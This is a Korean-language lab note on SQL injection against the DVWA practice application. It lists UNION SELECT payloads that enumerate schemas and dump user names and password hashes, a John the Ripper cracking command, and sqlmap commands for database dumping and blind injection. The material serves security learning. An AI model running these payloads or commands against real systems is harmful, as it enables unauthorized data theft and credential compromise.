# SQL Injection

## (수동점검 , 자동점검) 두 방법이 있다.

### 수동 점검

{% stepper %}
{% step %}
### 1) 기본 입력/오류 확인

* 잘못된 구문을 입력하면 syntax 에러를 출력 → SQL injection에 반응하는 것을 확인 &#x20;
* 0 을 입력해 해당되는 SQL 조건 문을 확인&#x20;
* 1\~5까지 입력을 허용 &#x20;
{% endstep %}

{% step %}
### 2) 의도적 구문 변경으로 동작 관찰

* 의도적으로 잘못된 구문 입력 &#x20;
* 의도적으로 참이 되는 구문을 입력 &#x20;
* 주석을 넣으니 다른 계정 정보도 확인할 수 있게 된다. &#x20;
* SQL 문을 잘 설정하면 공격자가 원하는 정보를 얻을 수도 있음&#x20;
{% endstep %}

{% step %}
### 3) 세션/쿠키를 이용한 추가 요청 시도

* cookie 정보를 이용해 세션을 흉내&#x20;
* 세션을 빌려 요청 웹 정보를 요청&#x20;
* 수동 점검이 가능한 것으로 확인
{% endstep %}

{% step %}
### 4) UNION SELECT 활용 (칼럼 수/배치 확인)

* UNION SELECT 구문을 활용하면 2개 이상의 SQL 구문을 결합해서 사용할 수 있음. &#x20;
* 칼럼의 수는 1이 아닌 것을 알 수 있음.
* 1번 칼럼이 First name, 2번째 칼럼이 Surname인 것을 알 수 있음. &#x20;
* 1번 칼럼에 First name, 2번 칼럼에는 다른 데이터가 출력되도록 구문을 작성할 수 있음.
* 예: `5' union select 1,@@version#` &#x20;
* 버전을 검색해서 DB 정보를 획득할 수 있음. &#x20;
{% endstep %}

{% step %}
### 5) information\_schema 활용 — 테이블/칼럼 열람

* 데이터 테이블 구조/스키마 확인 예:
  * `5' union select table_schema,2 from information_schema.tables#`\
    (첫번째 출력은 5번째 사용자 이름을 출력하는 내용)
  * `5' union select 1,table_name from information_schema.tables#`\
    스키마에서 모든 데이터베이스의 테이블 이름들을 가져오는 SQL 구문
* 예시 출력(일부):
* 특정 DB만 가져오기:
  * `5' union select 1,table_name from information_schema.tables where table_schema='dvwa'#`&#x20;
* 특정 테이블의 칼럼 확인:
  * `5' union select 1, column_name from information_schema.columns where table_name='users'#`&#x20;
{% endstep %}

{% step %}
### 6) 사용자/패스워드 열람 및 해시 크래킹

* user / password 칼럼의 정보를 열람하면 로그인 또한 가능할 것 같음.
  * `5' union select user, password from dvwa.users#`&#x20;
  * 패스워드가 암호화 되어 있어 크랙 툴이 필요함
* 일괄 hashing 코드 작성 / 암호화 정보 확인  &#x20;
* 일괄 암호화 크래킹 예:
  * `john --format=Raw-MD5 users.txt`&#x20;
{% endstep %}

{% step %}
### 7) 보안 수준별 취약점 관찰 (DVWA 예시)

* low&#x20;
  * 값을 받고 출력하는 기능만 있다. (보안 관련 코드가 없음)
* medium &#x20;
  * `id=1&Submit=Submit` 에 값을 변조하는 방법으로 SQL injection을 테스트
    * `id=1 or 1=1&Submit=Submit`
    * `id=1 or 1=1 union select user,password from dvwa.users&Submit=Submit` &#x20;
* high &#x20;
  * 세션으로 검증하는 기능이 추가됨&#x20;
  * 하지만 주석 처리에 대해서는 여전히 취약&#x20;
  * 주석 예: --(공백) 는 주석 처리
* impossible &#x20;
  * ' 를 넣어도 아무 반응이 없음.
  * 사용자 토큰이 있어서 URL을 바꿔서 넣어도 응답하지 않음.
  * SQL injection 만으로는 공략이 어렵다. (다른 취약점과 함께 사용해야 할 수 있음)
{% endstep %}
{% endstepper %}

***

### 자동 점검 툴

* Zap
  * [Zap](/broken/pages/64b87885235e58ca88ad256839d5a1ea768a3b01)&#x20;
  * 프록시 툴이지만 취약점 점검이 가능함.
  * 공격방법과 취약점에 대한 상세 정보 확인 가능.
* sqlmap
  * [sqlmap](/broken/pages/aafa05c925ede82d2f1c53d8e742970fca13f565)&#x20;
  * id 라는 파라미터가 취약하다는 것을 자동으로 탐지

예시 사용법 및 결과:

*   취약점 탐지 (예시)

    ```
    sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id
    ```
* sqlmap이 설명하는 취약점 요약 (총 4가지)&#x20;
*   DB 목록 표시

    ```
    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id --dbs
    ```
*   특정 DB의 테이블 보기

    ```
    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa --tables
    ```
*   특정 테이블의 컬럼 보기

    ```
    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa -T users --col
    ```
*   해시값 크래킹 및 덤프

    ```
    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa -T users --dump
    ```
*   information\_schema 테이블 열람 예시

    ```
    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D information_schema --tables
    ```

    ```
    sqlmap --cookie="PHPSESSID=...; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D information_schema -T tables --col
    ```

***

## Blind SQL Injection

* 문법에 대한 오류가 표시되지 않음.
* 경우의 수를 전부 넣어 봐야 함.

예: zap에서 취약한 파라미터를 찾고 sqlmap을 활용한 테스트

```
sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=low" -u "http://192.168.56.120/vulnerabilities/sqli_blind/?id=1&Submit=Submit" -p id --dbs
```

* 취약점 리스트 스냅샷:&#x20;
* 데이터베이스 리스트 스냅샷:&#x20;
